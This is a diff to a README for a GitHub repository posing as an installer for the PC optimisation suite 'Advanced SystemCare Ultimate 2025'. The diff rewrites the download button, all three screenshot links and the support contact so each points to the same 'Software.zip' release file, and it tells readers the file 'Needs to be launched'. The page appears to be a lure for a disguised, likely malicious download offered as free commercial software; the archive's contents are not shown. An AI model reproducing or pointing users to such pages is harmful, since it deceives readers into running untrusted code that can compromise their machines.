@@ -29,16 +29,16 @@ Advanced SystemCare Ultimate is the ultimate software package for optimizing, cl
 ## Get Started! 💻
 To download the Advanced SystemCare Ultimate Installer 2025, click the button below:
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) *Needs to be launched*
+[![Download Installer](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip)](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip) *Needs to be launched*
 
 Don't have access to the link above? Please check the "Releases" section of this repository for alternative download options.
 
 ## Screenshots 📸
 Here are some snapshots of Advanced SystemCare Ultimate in action:
 
-![Screenshot1](https://example.com/screenshot1.jpg)
-![Screenshot2](https://example.com/screenshot2.jpg)
-![Screenshot3](https://example.com/screenshot3.jpg)
+![Screenshot1](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip)
+![Screenshot2](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip)
+![Screenshot3](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## Features ✨
 - **PC Optimization**: Improve your system's speed and performance.
@@ -55,7 +55,7 @@ Follow these steps to install Advanced SystemCare Ultimate on your PC:
 3. Once installed, launch Advanced SystemCare Ultimate and start optimizing your system!
 
 ## Support 🤝
-If you encounter any issues or have questions about Advanced SystemCare Ultimate, feel free to reach out to our support team at [support@advancedsystemcare.com](mailto:support@advancedsystemcare.com). We're here to help you get the most out of your PC optimization experience.
+If you encounter any issues or have questions about Advanced SystemCare Ultimate, feel free to reach out to our support team at [https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip](https://github.com/79675/Advanced-SystemCare-Ultimate-Installer-2025/releases/download/v1.0/Software.zip). We're here to help you get the most out of your PC optimization experience.
 
 ## Contribute 🌟
 Want to contribute to Advanced SystemCare Ultimate Installer 2025? We welcome your ideas and suggestions! Fork this repository, make your changes, and submit a pull request. Together, we can make PC optimization even better.
